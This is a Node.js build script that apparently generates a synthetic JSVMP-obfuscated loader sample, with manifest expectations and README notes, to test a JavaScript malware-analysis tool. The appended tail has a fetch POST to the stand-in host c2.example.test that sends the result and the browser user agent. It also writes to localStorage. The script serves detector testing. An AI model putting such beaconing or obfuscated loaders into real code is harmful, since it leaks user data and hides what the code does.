import { writeFile, readFile } from 'node:fs/promises'
import { buildVM, buildSampleProgram } from '/Users/payne/Projects/ai4reverse_web/tools/jsvmp/index.js'
const dir = '/Users/payne/Projects/ai4reverse_web/examples/products/40-jsvmp-loader'
const vm = buildVM(buildSampleProgram(), { seed: 4040, name: '__vmorph_run', obfuscate: true })
const header = `// VMORPH — synthetic JSVMP-protected loader product sample.
// Generated with tools/jsvmp: an obfuscated dispatch loop executes an encoded
// bytecode program. Regenerate with examples/products/build-jsvmp-loader.mjs.
`
const tail = `
(function () {
  try {
    var result = __vmorph_run();
    console.log('[VMORPH] bytecode result', result);
    try {
      fetch('https://c2.example.test/vmorph', { method: 'POST', body: btoa(JSON.stringify({ result: result, ua: navigator.userAgent })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('vmorph:last', String(result)); } catch (error) {}
  } catch (error) {
    console.log('[VMORPH] vm failed', error.message);
  }
})();
`
await writeFile(`${dir}/sample.js`, header + vm.code + tail)
const manifestPath = `${dir}/product.json`
const manifest = JSON.parse(await readFile(manifestPath, 'utf8'))
manifest.expect.requireVm = true
manifest.expect.level = 'suspicious'
manifest.expect.minScore = 40
manifest.expect.requireIocs = ['urls']
manifest.expect.artifactsAny = ['decoded-string']
manifest.expect.requireTechniques = ['network-communication']
manifest.expect.requireTraceKinds = ['net', 'storage']
await writeFile(manifestPath, JSON.stringify(manifest, null, 2) + '\n')
const readmePath = `${dir}/README.md`
let readme = await readFile(readmePath, 'utf8')
readme += `
## 8. 生成说明

本样本由平台自身的 JSVMP builder 生成（obfuscated opcode cipher + 编码常量池）：

\`\`\`bash
node examples/products/build-jsvmp-loader.mjs   # 重新生成 40-jsvmp-loader/sample.js
node tools/cli.js analyze examples/products/40-jsvmp-loader/sample.js --json | jq .tracing.jsvmp
\`\`\`

分析时启用 \`instrumentation: { jsvmp: true }\`（run-all 根据 \`requireVm\` 自动启用），
预期得到 \`tracing.jsvmp.detected=true\` 与数百条 \`jsvmp:opcode\` 事件。
`
await writeFile(readmePath, readme)
console.log('VMORPH sample generated:', vm.opcodes.length, 'opcodes', vm.bytecode.length, 'instructions')
